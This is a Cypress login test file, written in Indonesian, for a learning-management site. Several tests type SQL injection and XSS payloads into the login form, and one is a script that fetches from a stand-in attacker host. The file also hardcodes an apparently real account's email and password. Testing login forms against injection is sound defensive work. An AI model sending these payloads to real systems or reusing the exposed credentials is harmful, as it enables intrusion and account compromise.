describe('Authentication Test Siswa', () => {
  const baseUrl = 'https://lms.teknologidigital.co.id';

  it('TC-AUTH-SI-01 - Masuk dengan email dan kata sandi valid', () => {
    cy.visit('https://lms.teknologidigital.co.id/login', { timeout: 120000 });
    cy.get('input[name="email"]').type('mariakeyni2010@gmail.com');
    cy.get('input[name="password"]').type('maria_ch123');
    cy.get('button[type="submit"]').click();
    cy.url().should('include', '/panel');
    cy.contains('Dashboard').should('be.visible');
  });

  it('TC-AUTH-SI-02 - Masuk dengan email kosong', () => {
    cy.visit(`${baseUrl}/login`);
    cy.get('input[name="password"]').type('maria_ch123');
    cy.get('button[type="submit"]').click();
    cy.get('input[name="email"]:invalid').should('exist');
  });

  it('TC-AUTH-SI-03 - Masuk dengan kata sandi kosong', () => {
    cy.visit(`${baseUrl}/login`);
    cy.get('input[name="email"]').type('mariakeyni2010@gmail.com');
    cy.get('button[type="submit"]').click();
    cy.get('input[name="password"]:invalid').should('exist');
  });

  it('TC-AUTH-SI-04 - Masuk tanpa mengisi email dan kata sandi', () => {
    cy.visit(`${baseUrl}/login`);
    cy.get('button[type="submit"]').click();
    cy.get('input[name="email"]:invalid').should('exist');
    cy.get('input[name="password"]:invalid').should('exist');
  });

  it('TC-AUTH-SI-05 - Login dengan email yang tidak sesuai', () => {
    cy.visit(`${baseUrl}/login`);
    cy.get('input[name="email"]').type('asavery@gmail.com');
    cy.get('input[name="password"]').type('maria_ch123');
    cy.get('button[type="submit"]').click();
    cy.contains('Email atau Kata Sandi Tidak Sesuai').should('be.visible');
  });

  it('TC-AUTH-SI-06 - Login dengan kata sandi yang tidak sesuai', () => {
    cy.visit(`${baseUrl}/login`);
    cy.get('input[name="email"]').type('mariakeyni2010@gmail.com');
    cy.get('input[name="password"]').type('waduth');
    cy.get('button[type="submit"]').click();
    cy.contains(/Email atau Kata Sandi Tidak Sesuai/i).should('be.visible');

  });

  it('TC-AUTH-SI-07 - Masuk tanpa koneksi internet', () => {
    // Tidak bisa otomatisasi via Cypress karena tidak bisa matikan koneksi.
    cy.log('⚠️ Test koneksi internet harus diuji manual atau via mocking network offline.');
  });

  it('TC-AUTH-SI-08 - Serangan SQL Injection pada field Email', () => {
    cy.visit(`${baseUrl}/login`);
    cy.get('input[name="email"]').type(`' or '1'='1`);
    cy.get('input[name="password"]').type('maria_ch123');
    cy.get('button[type="submit"]').click();
    cy.get('input[name="email"]').type("test'OR'1'='1@gmail.com");
    
   });

  it('TC-AUTH-SI-09 - Serangan SQL Injection pada field Kata Sandi', () => {
    cy.visit(`${baseUrl}/login`);
    cy.get('input[name="email"]').type('mariakeyni2010@gmail.com');
    cy.get('input[name="password"]').type(`' or '1'='1`);
    cy.get('button[type="submit"]').click();
    cy.contains(/Email atau Kata Sandi Tidak Sesuai/i).should('be.visible');

  });

  it('TC-AUTH-SI-10 - Serangan XSS pada field Email (payload/script)', () => {
    cy.visit(`${baseUrl}/login`);
    cy.get('input[name="email"]').type(`<script>alert('hi')</script>`);
    cy.get('input[name="password"]').type('maria_ch123');
    cy.get('button[type="submit"]').click();
    cy.get('input[name="email"]').type("test'<script>alert('hi')</script>'@gmail.com");;

  });

  it('TC-AUTH-SI-11 - Serangan XSS pada field Kata Sandi (payload/script)', () => {
    cy.visit(`${baseUrl}/login`);
    cy.get('input[name="email"]').type('mariakeyni2010@gmail.com');
    cy.get('input[name="password"]').type(`<script>fetch('https://attacker.com')</script>`);
    cy.get('button[type="submit"]').click();
    cy.contains('Email atau Kata Sandi Tidak Sesuai').should('be.visible');
  });

  it('TC-AUTH-SI-12 - Serangan XSS pada field Email (JavaScript)', () => {
    cy.visit(`${baseUrl}/login`);
    cy.get('input[name="email"]').type(`<img src=x onerror=alert(1)>`);
    cy.get('input[name="password"]').type('maria_ch123');
    cy.get('button[type="submit"]').click();
    cy.get('input[name="email"]').type("test'<img src=x onerror=alert(1)>'@gmail.com");;
  });

  it('TC-AUTH-SI-13 - Serangan XSS pada field Kata Sandi (JavaScript)', () => {
    cy.visit(`${baseUrl}/login`);
    cy.get('input[name="email"]').type('mariakeyni2010@gmail.com');
    cy.get('input[name="password"]').type(`<img src=x onerror=alert(1)>`);
    cy.get('button[type="submit"]').click();
    cy.contains('Email atau Kata Sandi Tidak Sesuai').should('be.visible');
  });
});
